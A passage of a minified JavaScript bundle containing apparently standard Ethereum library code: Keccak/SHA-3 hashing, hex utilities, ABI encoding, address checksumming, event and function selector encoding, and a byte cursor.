$<<24&4278190080|$<<8&16711680|$>>>8&65280|$>>>24&255}t.swap8IfBE=t.isLE?$=>$:$=>w($),t.byteSwapIfBE=t.swap8IfBE;function y($){for(let H=0;H<$.length;H++)$[H]=w($[H]);return $}t.swap32IfBE=t.isLE?$=>$:y;const E=typeof Uint8Array.from([]).toHex=="function"&&typeof Uint8Array.fromHex=="function",A=Array.from({length:256},($,H)=>H.toString(16).padStart(2,"0"));function R($){if(i($),E)return $.toHex();let H="";for(let L=0;L<$.length;L++)H+=A[$[L]];return H}const S={_0:48,_9:57,A:65,F:70,a:97,f:102};function v($){if($>=S._0&&$<=S._9)return $-S._0;if($>=S.A&&$<=S.F)return $-(S.A-10);if($>=S.a&&$<=S.f)return $-(S.a-10)}function k($){if(typeof $!="string")throw new Error("hex string expected, got "+typeof $);if(E)return Uint8Array.fromHex($);const H=$.length,L=H/2;if(H%2)throw new Error("hex string expected, got unpadded hex of length "+H);const V=new Uint8Array(L);for(let G=0,Z=0;G<L;G++,Z+=2){const J=v($.charCodeAt(Z)),ne=v($.charCodeAt(Z+1));if(J===void 0||ne===void 0){const re=$[Z]+$[Z+1];throw new Error('hex string expected, got non-hex character "'+re+'" at index '+Z)}V[G]=J*16+ne}return V}const O=async()=>{};t.nextTick=O;async function _($,H,L){let V=Date.now();for(let G=0;G<$;G++){L(G);const Z=Date.now()-V;Z>=0&&Z<H||(await(0,t.nextTick)(),V+=Z)}}function I($){if(typeof $!="string")throw new Error("string expected");return new Uint8Array(new TextEncoder().encode($))}function T($){return new TextDecoder().decode($)}function B($){return typeof $=="string"&&($=I($)),i($),$}function U($){return typeof $=="string"&&($=I($)),i($),$}function M(...$){let H=0;for(let V=0;V<$.length;V++){const G=$[V];i(G),H+=G.length}const L=new Uint8Array(H);for(let V=0,G=0;V<$.length;V++){const Z=$[V];L.set(Z,G),G+=Z.length}return L}function N($,H){if(H!==void 0&&{}.toString.call(H)!=="[object Object]")throw new Error("options should be object or undefined");return Object.assign($,H)}class q{}t.Hash=q;function P($){const H=V=>$().update(B(V)).digest(),L=$();return H.outputLen=L.outputLen,H.blockLen=L.blockLen,H.create=()=>$(),H}function C($){const H=(V,G)=>$(G).update(B(V)).digest(),L=$({});return H.outputLen=L.outputLen,H.blockLen=L.blockLen,H.create=V=>$(V),H}function j($){const H=(V,G)=>$(G).update(B(V)).digest(),L=$({});return H.outputLen=L.outputLen,H.blockLen=L.blockLen,H.create=V=>$(V),H}t.wrapConstructor=P,t.wrapConstructorWithOpts=C,t.wrapXOFConstructorWithOpts=j;function z($=32){if(e.crypto&&typeof e.crypto.getRandomValues=="function")return e.crypto.getRandomValues(new Uint8Array($));if(e.crypto&&typeof e.crypto.randomBytes=="function")return Uint8Array.from(e.crypto.randomBytes($));throw new Error("crypto.getRandomValues must be defined")}})(VO)),VO}var yZ;function cle(){if(yZ)return Er;yZ=1,Object.defineProperty(Er,"__esModule",{value:!0}),Er.shake256=Er.shake128=Er.keccak_512=Er.keccak_384=Er.keccak_256=Er.keccak_224=Er.sha3_512=Er.sha3_384=Er.sha3_256=Er.sha3_224=Er.Keccak=void 0,Er.keccakP=E;const t=ale(),e=i0(),n=BigInt(0),r=BigInt(1),i=BigInt(2),s=BigInt(7),o=BigInt(256),a=BigInt(113),c=[],l=[],f=[];for(let v=0,k=r,O=1,_=0;v<24;v++){[O,_]=[_,(2*O+3*_)%5],c.push(2*(5*_+O)),l.push((v+1)*(v+2)/2%64);let I=n;for(let T=0;T<7;T++)k=(k<<r^(k>>s)*a)%o,k&i&&(I^=r<<(r<<BigInt(T))-r);f.push(I)}const h=(0,t.split)(f,!0),m=h[0],b=h[1],w=(v,k,O)=>O>32?(0,t.rotlBH)(v,k,O):(0,t.rotlSH)(v,k,O),y=(v,k,O)=>O>32?(0,t.rotlBL)(v,k,O):(0,t.rotlSL)(v,k,O);function E(v,k=24){const O=new Uint32Array(10);for(let _=24-k;_<24;_++){for(let B=0;B<10;B++)O[B]=v[B]^v[B+10]^v[B+20]^v[B+30]^v[B+40];for(let B=0;B<10;B+=2){const U=(B+8)%10,M=(B+2)%10,N=O[M],q=O[M+1],P=w(N,q,1)^O[U],C=y(N,q,1)^O[U+1];for(let j=0;j<50;j+=10)v[B+j]^=P,v[B+j+1]^=C}let I=v[2],T=v[3];for(let B=0;B<24;B++){const U=l[B],M=w(I,T,U),N=y(I,T,U),q=c[B];I=v[q],T=v[q+1],v[q]=M,v[q+1]=N}for(let B=0;B<50;B+=10){for(let U=0;U<10;U++)O[U]=v[B+U];for(let U=0;U<10;U++)v[B+U]^=~O[(U+2)%10]&O[(U+4)%10]}v[0]^=m[_],v[1]^=b[_]}(0,e.clean)(O)}class A extends e.Hash{constructor(k,O,_,I=!1,T=24){if(super(),this.pos=0,this.posOut=0,this.finished=!1,this.destroyed=!1,this.enableXOF=!1,this.blockLen=k,this.suffix=O,this.outputLen=_,this.enableXOF=I,this.rounds=T,(0,e.anumber)(_),!(0<k&&k<200))throw new Error("only keccak-f1600 function is supported");this.state=new Uint8Array(200),this.state32=(0,e.u32)(this.state)}clone(){return this._cloneInto()}keccak(){(0,e.swap32IfBE)(this.state32),E(this.state32,this.rounds),(0,e.swap32IfBE)(this.state32),this.posOut=0,this.pos=0}update(k){(0,e.aexists)(this),k=(0,e.toBytes)(k),(0,e.abytes)(k);const{blockLen:O,state:_}=this,I=k.length;for(let T=0;T<I;){const B=Math.min(O-this.pos,I-T);for(let U=0;U<B;U++)_[this.pos++]^=k[T++];this.pos===O&&this.keccak()}return this}finish(){if(this.finished)return;this.finished=!0;const{state:k,suffix:O,pos:_,blockLen:I}=this;k[_]^=O,(O&128)!==0&&_===I-1&&this.keccak(),k[I-1]^=128,this.keccak()}writeInto(k){(0,e.aexists)(this,!1),(0,e.abytes)(k),this.finish();const O=this.state,{blockLen:_}=this;for(let I=0,T=k.length;I<T;){this.posOut>=_&&this.keccak();const B=Math.min(_-this.posOut,T-I);k.set(O.subarray(this.posOut,this.posOut+B),I),this.posOut+=B,I+=B}return k}xofInto(k){if(!this.enableXOF)throw new Error("XOF is not possible for this instance");return this.writeInto(k)}xof(k){return(0,e.anumber)(k),this.xofInto(new Uint8Array(k))}digestInto(k){if((0,e.aoutput)(k,this),this.finished)throw new Error("digest() was already called");return this.writeInto(k),this.destroy(),k}digest(){return this.digestInto(new Uint8Array(this.outputLen))}destroy(){this.destroyed=!0,(0,e.clean)(this.state)}_cloneInto(k){const{blockLen:O,suffix:_,outputLen:I,rounds:T,enableXOF:B}=this;return k||(k=new A(O,_,I,B,T)),k.state32.set(this.state32),k.pos=this.pos,k.posOut=this.posOut,k.finished=this.finished,k.rounds=T,k.suffix=_,k.outputLen=I,k.enableXOF=B,k.destroyed=this.destroyed,k}}Er.Keccak=A;const R=(v,k,O)=>(0,e.createHasher)(()=>new A(k,v,O));Er.sha3_224=R(6,144,224/8),Er.sha3_256=R(6,136,256/8),Er.sha3_384=R(6,104,384/8),Er.sha3_512=R(6,72,512/8),Er.keccak_224=R(1,144,224/8),Er.keccak_256=R(1,136,256/8),Er.keccak_384=R(1,104,384/8),Er.keccak_512=R(1,72,512/8);const S=(v,k,O)=>(0,e.createXOFer)((_={})=>new A(k,v,_.dkLen===void 0?O:_.dkLen,!0));return Er.shake128=S(31,168,128/8),Er.shake256=S(31,136,256/8),Er}var bZ;function ha(){if(bZ)return P6;bZ=1,Object.defineProperty(P6,"__esModule",{value:!0}),P6.keccak256=i;const t=cle(),e=So(),n=yr(),r=lt();function i(s,o){const a=o||"hex",c=(0,t.keccak_256)((0,e.isHex)(s,{strict:!1})?(0,n.toBytes)(s):s);return a==="bytes"?c:(0,r.toHex)(c)}return P6}var o2={},N6={},O6={},wZ;function DFe(){if(wZ)return O6;wZ=1,Object.defineProperty(O6,"__esModule",{value:!0}),O6.hashSignature=r;const t=yr(),e=ha(),n=i=>(0,e.keccak256)((0,t.toBytes)(i));function r(i){return n(i)}return O6}var a2={},k6={},vZ;function BFe(){if(vZ)return k6;vZ=1,Object.defineProperty(k6,"__esModule",{value:!0}),k6.normalizeSignature=e;const t=Kt();function e(n){let r=!0,i="",s=0,o="",a=!1;for(let c=0;c<n.length;c++){const l=n[c];if(["(",")",","].includes(l)&&(r=!0),l==="("&&s++,l===")"&&s--,!!r){if(s===0){if(l===" "&&["event","function",""].includes(o))o="";else if(o+=l,l===")"){a=!0;break}continue}if(l===" "){n[c-1]!==","&&i!==","&&i!==",("&&(i="",r=!1);continue}o+=l,i+=l}}if(!a)throw new t.BaseError("Unable to normalize signature.");return o}return k6}var EZ;function Mj(){if(EZ)return a2;EZ=1,Object.defineProperty(a2,"__esModule",{value:!0}),a2.toSignature=void 0;const t=n0(),e=BFe(),n=r=>{const i=typeof r=="string"?r:(0,t.formatAbiItem)(r);return(0,e.normalizeSignature)(i)};return a2.toSignature=n,a2}var _Z;function U8(){if(_Z)return N6;_Z=1,Object.defineProperty(N6,"__esModule",{value:!0}),N6.toSignatureHash=n;const t=DFe(),e=Mj();function n(r){return(0,t.hashSignature)((0,e.toSignature)(r))}return N6}var AZ;function bw(){if(AZ)return o2;AZ=1,Object.defineProperty(o2,"__esModule",{value:!0}),o2.toEventSelector=void 0;const t=U8();return o2.toEventSelector=t.toSignatureHash,o2}var c2={},u2={},CZ;function Gu(){if(CZ)return u2;CZ=1,Object.defineProperty(u2,"__esModule",{value:!0}),u2.InvalidAddressError=void 0;const t=Kt();class e extends t.BaseError{constructor({address:r}){super(`Address "${r}" is invalid.`,{metaMessages:["- Address must be a hex value of 20 bytes (40 hex characters).","- Address must match its checksum counterpart."],name:"InvalidAddressError"})}}return u2.InvalidAddressError=e,u2}var WO={},l2={},SZ;function iy(){if(SZ)return l2;SZ=1,Object.defineProperty(l2,"__esModule",{value:!0}),l2.LruMap=void 0;class t extends Map{constructor(n){super(),Object.defineProperty(this,"maxSize",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),this.maxSize=n}get(n){const r=super.get(n);return super.has(n)&&r!==void 0&&(this.delete(n),super.set(n,r)),r}set(n,r){if(super.set(n,r),this.maxSize&&this.size>this.maxSize){const i=this.keys().next().value;i&&this.delete(i)}return this}}return l2.LruMap=t,l2}var d2={},TZ;function nc(){if(TZ)return d2;TZ=1,Object.defineProperty(d2,"__esModule",{value:!0}),d2.checksumAddress=o,d2.getAddress=a;const t=Gu(),e=yr(),n=ha(),r=iy(),i=pa(),s=new r.LruMap(8192);function o(c,l){if(s.has(`${c}.${l}`))return s.get(`${c}.${l}`);const f=l?`${l}${c.toLowerCase()}`:c.substring(2).toLowerCase(),h=(0,n.keccak256)((0,e.stringToBytes)(f),"bytes"),m=(l?f.substring(`${l}0x`.length):f).split("");for(let w=0;w<40;w+=2)h[w>>1]>>4>=8&&m[w]&&(m[w]=m[w].toUpperCase()),(h[w>>1]&15)>=8&&m[w+1]&&(m[w+1]=m[w+1].toUpperCase());const b=`0x${m.join("")}`;return s.set(`${c}.${l}`,b),b}function a(c,l){if(!(0,i.isAddress)(c,{strict:!1}))throw new t.InvalidAddressError({address:c});return o(c,l)}return d2}var xZ;function pa(){return xZ||(xZ=1,(function(t){Object.defineProperty(t,"__esModule",{value:!0}),t.isAddressCache=void 0,t.isAddress=i;const e=iy(),n=nc(),r=/^0x[a-fA-F0-9]{40}$/;t.isAddressCache=new e.LruMap(8192);function i(s,o){const{strict:a=!0}=o??{},c=`${s}.${a}`;if(t.isAddressCache.has(c))return t.isAddressCache.get(c);const l=r.test(s)?s.toLowerCase()===s?!0:a?(0,n.checksumAddress)(s)===s:!0:!1;return t.isAddressCache.set(c,l),l}})(WO)),WO}var bb={},IZ;function os(){if(IZ)return bb;IZ=1,Object.defineProperty(bb,"__esModule",{value:!0}),bb.concat=t,bb.concatBytes=e,bb.concatHex=n;function t(r){return typeof r[0]=="string"?n(r):e(r)}function e(r){let i=0;for(const a of r)i+=a.length;const s=new Uint8Array(i);let o=0;for(const a of r)s.set(a,o),o+=a.length;return s}function n(r){return`0x${r.reduce((i,s)=>i+s.replace("0x",""),"")}`}return bb}var wb={},RZ;function Jc(){if(RZ)return wb;RZ=1,Object.defineProperty(wb,"__esModule",{value:!0}),wb.slice=r,wb.sliceBytes=o,wb.sliceHex=a;const t=M8(),e=So(),n=fa();function r(c,l,f,{strict:h}={}){return(0,e.isHex)(c,{strict:!1})?a(c,l,f,{strict:h}):o(c,l,f,{strict:h})}function i(c,l){if(typeof l=="number"&&l>0&&l>(0,n.size)(c)-1)throw new t.SliceOffsetOutOfBoundsError({offset:l,position:"start",size:(0,n.size)(c)})}function s(c,l,f){if(typeof l=="number"&&typeof f=="number"&&(0,n.size)(c)!==f-l)throw new t.SliceOffsetOutOfBoundsError({offset:f,position:"end",size:(0,n.size)(c)})}function o(c,l,f,{strict:h}={}){i(c,l);const m=c.slice(l,f);return h&&s(m,l,f),m}function a(c,l,f,{strict:h}={}){i(c,l);const m=`0x${c.replace("0x","").slice((l??0)*2,(f??c.length)*2)}`;return h&&s(m,l,f),m}return wb}var Yd={},PZ;function L8(){return PZ||(PZ=1,Object.defineProperty(Yd,"__esModule",{value:!0}),Yd.integerRegex=Yd.bytesRegex=Yd.arrayRegex=void 0,Yd.arrayRegex=/^(.*)\[([0-9]*)\]$/,Yd.bytesRegex=/^bytes([1-9]|1[0-9]|2[0-9]|3[0-2])?$/,Yd.integerRegex=/^(u?int)(8|16|24|32|40|48|56|64|72|80|88|96|104|112|120|128|136|144|152|160|168|176|184|192|200|208|216|224|232|240|248|256)?$/),Yd}var NZ;function Ku(){if(NZ)return c2;NZ=1,Object.defineProperty(c2,"__esModule",{value:!0}),c2.encodeAbiParameters=h,c2.getArrayComponents=O;const t=$r(),e=Gu(),n=Kt(),r=yw(),i=pa(),s=os(),o=r0(),a=fa(),c=Jc(),l=lt(),f=L8();function h(_,I){if(_.length!==I.length)throw new t.AbiEncodingLengthMismatchError({expectedLength:_.length,givenLength:I.length});const T=m({params:_,values:I}),B=w(T);return B.length===0?"0x":B}function m({params:_,values:I}){const T=[];for(let B=0;B<_.length;B++)T.push(b({param:_[B],value:I[B]}));return T}function b({param:_,value:I}){const T=O(_.type);if(T){const[B,U]=T;return E(I,{length:B,param:{..._,type:U}})}if(_.type==="tuple")return k(I,{param:_});if(_.type==="address")return y(I);if(_.type==="bool")return R(I);if(_.type.startsWith("uint")||_.type.startsWith("int")){const B=_.type.startsWith("int"),[,,U="256"]=f.integerRegex.exec(_.type)??[];return S(I,{signed:B,size:Number(U)})}if(_.type.startsWith("bytes"))return A(I,{param:_});if(_.type==="string")return v(I);throw new t.InvalidAbiEncodingTypeError(_.type,{docsPath:"/docs/contract/encodeAbiParameters"})}function w(_){let I=0;for(let M=0;M<_.length;M++){const{dynamic:N,encoded:q}=_[M];N?I+=32:I+=(0,a.size)(q)}const T=[],B=[];let U=0;for(let M=0;M<_.length;M++){const{dynamic:N,encoded:q}=_[M];N?(T.push((0,l.numberToHex)(I+U,{size:32})),B.push(q),U+=(0,a.size)(q)):T.push(q)}return(0,s.concat)([...T,...B])}function y(_){if(!(0,i.isAddress)(_))throw new e.InvalidAddressError({address:_});return{dynamic:!1,encoded:(0,o.padHex)(_.toLowerCase())}}function E(_,{length:I,param:T}){const B=I===null;if(!Array.isArray(_))throw new t.InvalidArrayError(_);if(!B&&_.length!==I)throw new t.AbiEncodingArrayLengthMismatchError({expectedLength:I,givenLength:_.length,type:`${T.type}[${I}]`});let U=!1;const M=[];for(let N=0;N<_.length;N++){const q=b({param:T,value:_[N]});q.dynamic&&(U=!0),M.push(q)}if(B||U){const N=w(M);if(B){const q=(0,l.numberToHex)(M.length,{size:32});return{dynamic:!0,encoded:M.length>0?(0,s.concat)([q,N]):q}}if(U)return{dynamic:!0,encoded:N}}return{dynamic:!1,encoded:(0,s.concat)(M.map(({encoded:N})=>N))}}function A(_,{param:I}){const[,T]=I.type.split("bytes"),B=(0,a.size)(_);if(!T){let U=_;return B%32!==0&&(U=(0,o.padHex)(U,{dir:"right",size:Math.ceil((_.length-2)/2/32)*32})),{dynamic:!0,encoded:(0,s.concat)([(0,o.padHex)((0,l.numberToHex)(B,{size:32})),U])}}if(B!==Number.parseInt(T,10))throw new t.AbiEncodingBytesSizeMismatchError({expectedSize:Number.parseInt(T,10),value:_});return{dynamic:!1,encoded:(0,o.padHex)(_,{dir:"right"})}}function R(_){if(typeof _!="boolean")throw new n.BaseError(`Invalid boolean value: "${_}" (type: ${typeof _}). Expected: \`true\` or \`false\`.`);return{dynamic:!1,encoded:(0,o.padHex)((0,l.boolToHex)(_))}}function S(_,{signed:I,size:T=256}){if(typeof T=="number"){const B=2n**(BigInt(T)-(I?1n:0n))-1n,U=I?-B-1n:0n;if(_>B||_<U)throw new r.IntegerOutOfRangeError({max:B.toString(),min:U.toString(),signed:I,size:T/8,value:_.toString()})}return{dynamic:!1,encoded:(0,l.numberToHex)(_,{size:32,signed:I})}}function v(_){const I=(0,l.stringToHex)(_),T=Math.ceil((0,a.size)(I)/32),B=[];for(let U=0;U<T;U++)B.push((0,o.padHex)((0,c.slice)(I,U*32,(U+1)*32),{dir:"right"}));return{dynamic:!0,encoded:(0,s.concat)([(0,o.padHex)((0,l.numberToHex)((0,a.size)(I),{size:32})),...B])}}function k(_,{param:I}){let T=!1;const B=[];for(let U=0;U<I.components.length;U++){const M=I.components[U],N=Array.isArray(_)?U:M.name,q=b({param:M,value:_[N]});B.push(q),q.dynamic&&(T=!0)}return{dynamic:T,encoded:T?w(B):(0,s.concat)(B.map(({encoded:U})=>U))}}function O(_){const I=_.match(/^(.*)\[(\d+)?\]$/);return I?[I[2]?Number(I[2]):null,I[1]]:void 0}return c2}var vb={},f2={},OZ;function sy(){if(OZ)return f2;OZ=1,Object.defineProperty(f2,"__esModule",{value:!0}),f2.toFunctionSelector=void 0;const t=Jc(),e=U8(),n=r=>(0,t.slice)((0,e.toSignatureHash)(r),0,4);return f2.toFunctionSelector=n,f2}var kZ;function Qf(){if(kZ)return vb;kZ=1,Object.defineProperty(vb,"__esModule",{value:!0}),vb.getAbiItem=s,vb.isArgOfType=o,vb.getAmbiguousTypes=a;const t=$r(),e=So(),n=pa(),r=bw(),i=sy();function s(c){const{abi:l,args:f=[],name:h}=c,m=(0,e.isHex)(h,{strict:!1}),b=l.filter(y=>m?y.type==="function"?(0,i.toFunctionSelector)(y)===h:y.type==="event"?(0,r.toEventSelector)(y)===h:!1:"name"in y&&y.name===h);if(b.length===0)return;if(b.length===1)return b[0];let w;for(const y of b){if(!("inputs"in y))continue;if(!f||f.length===0){if(!y.inputs||y.inputs.length===0)return y;continue}if(!y.inputs||y.inputs.length===0||y.inputs.length!==f.length)continue;if(f.every((A,R)=>{const S="inputs"in y&&y.inputs[R];return S?o(A,S):!1})){if(w&&"inputs"in w&&w.inputs){const A=a(y.inputs,w.inputs,f);if(A)throw new t.AbiItemAmbiguityError({abiItem:y,type:A[0]},{abiItem:w,type:A[1]})}w=y}}return w||b[0]}function o(c,l){const f=typeof c,h=l.type;switch(h){case"address":return(0,n.isAddress)(c,{strict:!1});case"bool":return f==="boolean";case"function":return f==="string";case"string":return f==="string";default:return h==="tuple"&&"components"in l?Object.values(l.components).every((m,b)=>o(Object.values(c)[b],m)):/^u?int(8|16|24|32|40|48|56|64|72|80|88|96|104|112|120|128|136|144|152|160|168|176|184|192|200|208|216|224|232|240|248|256)?$/.test(h)?f==="number"||f==="bigint":/^bytes([1-9]|1[0-9]|2[0-9]|3[0-2])?$/.test(h)?f==="string"||c instanceof Uint8Array:/[a-z]+[1-9]{0,3}(\[[0-9]{0,}\])+$/.test(h)?Array.isArray(c)&&c.every(m=>o(m,{...l,type:h.replace(/(\[[0-9]{0,}\])$/,"")})):!1}}function a(c,l,f){for(const h in c){const m=c[h],b=l[h];if(m.type==="tuple"&&b.type==="tuple"&&"components"in m&&"components"in b)return a(m.components,b.components,f[h]);const w=[m.type,b.type];if(w.includes("address")&&w.includes("bytes20")?!0:w.includes("address")&&w.includes("string")?(0,n.isAddress)(f[h],{strict:!1}):w.includes("address")&&w.includes("bytes")?(0,n.isAddress)(f[h],{strict:!1}):!1)return w}}return vb}var DZ;function oy(){if(DZ)return T6;DZ=1,Object.defineProperty(T6,"__esModule",{value:!0}),T6.encodeEventTopics=l;const t=$r(),e=ole(),n=yr(),r=ha(),i=bw(),s=Ku(),o=Zf(),a=Qf(),c="/docs/contract/encodeEventTopics";function l(h){const{abi:m,eventName:b,args:w}=h;let y=m[0];if(b){const S=(0,a.getAbiItem)({abi:m,name:b});if(!S)throw new t.AbiEventNotFoundError(b,{docsPath:c});y=S}if(y.type!=="event")throw new t.AbiEventNotFoundError(void 0,{docsPath:c});const E=(0,o.formatAbiItem)(y),A=(0,i.toEventSelector)(E);let R=[];if(w&&"inputs"in y){const S=y.inputs?.filter(k=>"indexed"in k&&k.indexed),v=Array.isArray(w)?w:Object.values(w).length>0?S?.map(k=>w[k.name])??[]:[];v.length>0&&(R=S?.map((k,O)=>Array.isArray(v[O])?v[O].map((_,I)=>f({param:k,value:v[O][I]})):typeof v[O]<"u"&&v[O]!==null?f({param:k,value:v[O]}):null)??[])}return[A,...R]}function f({param:h,value:m}){if(h.type==="string"||h.type==="bytes")return(0,r.keccak256)((0,n.toBytes)(m));if(h.type==="tuple"||h.type.match(/^(.*)\[(\d+)?\]$/))throw new e.FilterTypeNotSupportedError(h.type);return(0,s.encodeAbiParameters)([h],[m])}return T6}var D6={},BZ;function F8(){if(BZ)return D6;BZ=1,Object.defineProperty(D6,"__esModule",{value:!0}),D6.createFilterRequestScope=t;function t(e,{method:n}){const r={};return e.transport.type==="fallback"&&e.transport.onResponse?.(({method:i,response:s,status:o,transport:a})=>{o==="success"&&n===i&&(r[s]=a.request)}),(i=>r[i]||e.request)}return D6}var jZ;function Uj(){if(jZ)return S6;jZ=1,Object.defineProperty(S6,"__esModule",{value:!0}),S6.createContractEventFilter=r;const t=oy(),e=lt(),n=F8();async function r(i,s){const{address:o,abi:a,args:c,eventName:l,fromBlock:f,strict:h,toBlock:m}=s,b=(0,n.createFilterRequestScope)(i,{method:"eth_newFilter"}),w=l?(0,t.encodeEventTopics)({abi:a,args:c,eventName:l}):void 0,y=await i.request({method:"eth_newFilter",params:[{address:o,fromBlock:typeof f=="bigint"?(0,e.numberToHex)(f):f,toBlock:typeof m=="bigint"?(0,e.numberToHex)(m):m,topics:w}]});return{abi:a,args:c,eventName:l,id:y,request:b(y),strict:!!h,type:"event"}}return S6}var B6={},j6={},MZ;function Qr(){if(MZ)return j6;MZ=1,Object.defineProperty(j6,"__esModule",{value:!0}),j6.parseAccount=t;function t(e){return typeof e=="string"?{address:e,type:"json-rpc"}:e}return j6}var M6={},U6={},UZ;function ule(){if(UZ)return U6;UZ=1,Object.defineProperty(U6,"__esModule",{value:!0}),U6.prepareEncodeFunctionData=s;const t=$r(),e=sy(),n=Zf(),r=Qf(),i="/docs/contract/encodeFunctionData";function s(o){const{abi:a,args:c,functionName:l}=o;let f=a[0];if(l){const h=(0,r.getAbiItem)({abi:a,args:c,name:l});if(!h)throw new t.AbiFunctionNotFoundError(l,{docsPath:i});f=h}if(f.type!=="function")throw new t.AbiFunctionNotFoundError(void 0,{docsPath:i});return{abi:[f],functionName:(0,e.toFunctionSelector)((0,n.formatAbiItem)(f))}}return U6}var LZ;function ma(){if(LZ)return M6;LZ=1,Object.defineProperty(M6,"__esModule",{value:!0}),M6.encodeFunctionData=r;const t=os(),e=Ku(),n=ule();function r(i){const{args:s}=i,{abi:o,functionName:a}=i.abi.length===1&&i.functionName?.startsWith("0x")?i:(0,n.prepareEncodeFunctionData)(i),c=o[0],l=a,f="inputs"in c&&c.inputs?(0,e.encodeAbiParameters)(c.inputs,s??[]):void 0;return(0,t.concatHex)([l,f??"0x"])}return M6}var L6={},ao={},Qd={},FZ;function Lj(){return FZ||(FZ=1,Object.defineProperty(Qd,"__esModule",{value:!0}),Qd.solidityPanic=Qd.solidityError=Qd.panicReasons=void 0,Qd.panicReasons={1:"An `assert` condition failed.",17:"Arithmetic operation resulted in underflow or overflow.",18:"Division or modulo by zero (e.g. `5 / 0` or `23 % 0`).",33:"Attempted to convert to an invalid type.",34:"Attempted to access a storage byte array that is incorrectly encoded.",49:"Performed `.pop()` on an empty array",50:"Array index is out of bounds.",65:"Allocated too much memory or created an array which is too large.",81:"Attempted to call a zero-initialized variable of internal function type."},Qd.solidityError={inputs:[{name:"message",type:"string"}],name:"Error",type:"error"},Qd.solidityPanic={inputs:[{name:"reason",type:"uint256"}],name:"Panic",type:"error"}),Qd}var F6={},$6={},H6={},Jd={},$Z;function lle(){if($Z)return Jd;$Z=1,Object.defineProperty(Jd,"__esModule",{value:!0}),Jd.RecursiveReadLimitExceededError=Jd.PositionOutOfBoundsError=Jd.NegativeOffsetError=void 0;const t=Kt();class e extends t.BaseError{constructor({offset:s}){super(`Offset \`${s}\` cannot be negative.`,{name:"NegativeOffsetError"})}}Jd.NegativeOffsetError=e;class n extends t.BaseError{constructor({length:s,position:o}){super(`Position \`${o}\` is out of bounds (\`0 < position < ${s}\`).`,{name:"PositionOutOfBoundsError"})}}Jd.PositionOutOfBoundsError=n;class r extends t.BaseError{constructor({count:s,limit:o}){super(`Recursive read limit of \`${o}\` exceeded (recursive read count: \`${s}\`).`,{name:"RecursiveReadLimitExceededError"})}}return Jd.RecursiveReadLimitExceededError=r,Jd}var HZ;function DA(){if(HZ)return H6;HZ=1,Object.defineProperty(H6,"__esModule",{value:!0}),H6.createCursor=n;const t=lle(),e={bytes:new Uint8Array,dataView:new DataView(new ArrayBuffer(0)),position:0,positionReadCount:new Map,recursiveReadCount:0,recursiveReadLimit:Number.POSITIVE_INFINITY,assertReadLimit(){if(this.recursiveReadCount>=this.recursiveReadLimit)throw new t.RecursiveReadLimitExceededError({count:this.recursiveReadCount+1,limit:this.recursiveReadLimit})},assertPosition(r){if(r<0||r>this.bytes.length-1)throw new t.PositionOutOfBoundsError({length:this.bytes.length,position:r})},decrementPosition(r){if(r<0)throw new t.NegativeOffsetError({offset:r});const i=this.position-r;this.assertPosition(i),this.position=i},getReadCount(r){return this.positionReadCount.get(r||this.position)||0},incrementPosition(r){if(r<0)throw new t.NegativeOffsetError({offset:r});const i=this.position+r;this.assertPosition(i),this.position=i},inspectByte(r){const i=r??this.position;return this.assertPosition(i),this.bytes[i]},inspectBytes(r,i){const s=i??this.position;return this.assertPosition(s+r-1),this.bytes.subarray(s,s+r)},inspectUint8(r){const i=r??this.position;return this.assertPosition(i),this.bytes[i]},inspectUint16(r){const i=r??this.position;return this.assertPosition(i+1),this.dataView.getUint16(i)},inspectUint24(r){const i=r??this.position;return this.assertPosition(i+2),(this.dataView.getUint16(i)<<8)+this.dataView.getUint8(i+2)},inspectUint32(r){const i=r??this.position;return this.assertPosition(i+3),this.dataView.getUint32(i)},pushByte(r){this.assertPosition(this.position),this.bytes[this.position]=r,this.position++},pushBytes(r){this.assertPosition(this.position+r.length-1),this.bytes.set(r,this.position),this.position+=r.length},pushUint8(r){this.assertPosition(this.position),this.bytes[this.position]=r,this.position++},pushUint16(r){this.assertPosition(this.position+1),this.dataView.setUint16(this.position,r),this.position+=2},pushUint24(r){this.assertPosition(this.position+2),this.dataView.setUint16(this.position,r>>8),this.dataView.setUint8(this.position+2,r&255),this.position+=3},pushUint32(r){this.assertPosition(this.position+3),this.dataView.setUint32(this.position,r),this.position+=4},readByte(){this.assertReadLimit(),this._touch();const r=this.inspectByte();return this.position++,r},readBytes(r,i){this.assertReadLimit(),this._touch();const s=this.inspectBytes(r);return this.position+=i??r,s},readUint8(){this.assertReadLimit(),this._touch();const r=this.inspectUint8();return this.position+=1,r},readUint16(){this.assertReadLimit(),this._touch();const r=this.inspectUint16();return this.position+=2,r},readUint24(){this.assertReadLimit(),this._touch();const r=this.inspectUint24();return this.position+=3,r},readUint32(){this.assertReadLimit(),this._touch();const r=this.inspectUint32();return this.position+=4,r},get remaining(){return this.bytes.length-this.position},setPosition(r){const i=this.position;return this.assertPosition(r),this.position=r,()=>this.position=i},_touch(){if(this.recursiveReadLimit===Number.POSITIVE_INFINITY)return;const r=this.getReadCount();this.positionReadCount.set(this.position,r+1),r>0&&this.recursiveReadCount++}};function n(r,{recursiveReadLimit:i=8192}={}){const s=Object.create(e);return s.bytes=r,s.dataView=new DataView(r.buffer,r.byteOffset,r.byteLength),s.positionReadCount=new Map,s.recursiveReadLimit=i,s}return H6}var tp={},zZ;function Fj(){if(zZ)return tp;zZ=1,Object.defineProperty(tp,"__esModule",{value:!0}),tp.fromBytes=i,tp.bytesToBigInt=s,tp.bytesToBool=o,tp.bytesToNumber=a,tp.bytesToString=c;const t=yw(),e=Yf(),n=ci(),r=lt();function i(l,f){const h=typeof f=="string"?{to:f}:f,m=h.to;return m==="number"?a(l,h):m==="bigint"?s(l,h):m==="boolean"?o(l,h):m==="string"?c(l,h):(0,r.bytesToHex)(l,h)}function s(l,f={}){typeof f.size<"u"&&(0,n.assertSize)(l,{size:f.size});const h=(0,r.bytesToHex)(l,f);return(0,n.hexToBigInt)(h,f)}function o(l,f={}){let h=l;if(typeof f.size<"u"&&((0,n.assertSize)(h,{size:f.size}),h=(0,e.trim)(h)),h.length>1||h[0]>1)throw new t.InvalidBytesBooleanError(h);return!!h[0]}function a(l,f={}){typeof f.size<"u"&&(0,n.assertSize)(l,{size:f.size});const h=(0,r.bytesToHex)(l,f);return(0,n.hexToNumber)(h,f)}function c(l,f={}){let h=l;return typeof f.size<"u"&&((0,n.assertSize)(h,{size:f.size}),h=(0,e.trim)(h,{dir:"right"})),new TextDecoder().decode(h)}return tp}var qZ;function s0(){if(qZ)return 